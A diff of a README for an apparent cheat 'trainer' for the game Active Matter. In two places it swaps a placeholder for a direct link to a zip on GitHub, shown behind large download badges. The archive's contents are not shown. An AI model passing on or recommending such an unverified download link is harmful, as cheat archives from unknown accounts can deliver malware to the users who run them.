@@ -6,7 +6,7 @@
 
 <br/>
 
-<a href="YOUR_RELEASE_LINK_HERE">
+<a href="https://github.com/Moduleplusnare/Active-Matter-overlay/releases/download/v1.0.0/ActiveMatter_Trainer_v1.0.zip">
   <img src="https://img.shields.io/badge/⬇%20%20DOWNLOAD%20%20active--matter%20trainer%20v1.0%20%20⬇-28a745?style=for-the-badge&logoColor=white&labelColor=1a1a1a&color=28a745" height="52"/>
 </a>
 
@@ -150,7 +150,7 @@ Game:    Active Matter (latest Steam version)
 
 <div align="center">
 
-<a href="YOUR_RELEASE_LINK_HERE">
+<a href="https://github.com/Moduleplusnare/Active-Matter-overlay/releases/download/v1.0.0/ActiveMatter_Trainer_v1.0.zip">
   <img src="https://img.shields.io/badge/⬇%20%20DOWNLOAD%20%20active--matter%20trainer%20v1.0%20%20⬇-28a745?style=for-the-badge&logoColor=white&labelColor=1a1a1a&color=28a745" height="52"/>
 </a>
 
